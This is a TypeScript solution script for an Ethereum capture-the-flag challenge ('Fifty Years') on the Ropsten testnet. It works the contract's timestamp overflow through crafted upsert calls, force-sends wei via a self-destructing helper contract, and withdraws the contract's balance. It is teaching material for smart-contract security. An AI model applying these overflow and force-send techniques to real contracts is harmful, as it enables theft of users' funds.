import { MaxUint256, One } from "@ethersproject/constants";
import { Contract, ContractFactory } from "@ethersproject/contracts";
import { formatEther } from "@ethersproject/units";

import { artifacts } from "../artifacts";
import { provider, wallets } from "../constants";
import { deployments } from "../deployments";
import { log } from "../utils";

export const fiftyYears = async (player = wallets[0]): Promise<void> => {
  const playerAddress = await player.getAddress();
  log(`Player address = ${playerAddress}`);
  log(`Player balance = ${formatEther(await provider.getBalance(playerAddress))}`);

  const challenge = new Contract(
    deployments.ropsten.FiftyYearsChallenge.address,
    deployments.ropsten.FiftyYearsChallenge.abi,
    provider,
  ).connect(player);

  log(`Preparing to solve challenge at ${challenge.address}`);

  const tx1 = await challenge.upsert(1, MaxUint256.sub("86400").add(One), { value: "1" });
  log(`Sending upsert 1: ${tx1.hash}`);
  await tx1.wait();
  log(`Upsert 1 has been mined`);

  const tx2 = await challenge.upsert(2, 0, { value: "2" });
  log(`Sending upsert 2: ${tx2.hash}`);
  await tx2.wait();
  log(`Upsert 2 has been mined`);

  log(`Forcefully sending 2 wei to the challenge contract`);
  const factory = new ContractFactory(
    artifacts.ForceSend.abi,
    artifacts.ForceSend.bytecode,
    player,
  );
  const sender = await factory.deploy(challenge.address, { value: "2" });
  await sender.deployTransaction.wait();
  log(`Successfully sent 2 wei to the challenge contract`);

  const tx3 = await challenge.withdraw(2);
  log(`Sending withdraw tx: ${tx3.hash}`);
  await tx3.wait();
  log(`Withdraw tx has been mined`);

  log(`Challenge balance = ${await provider.getBalance(challenge.address)}`);
  log(`Challenge complete = ${await challenge.isComplete()}`);

};

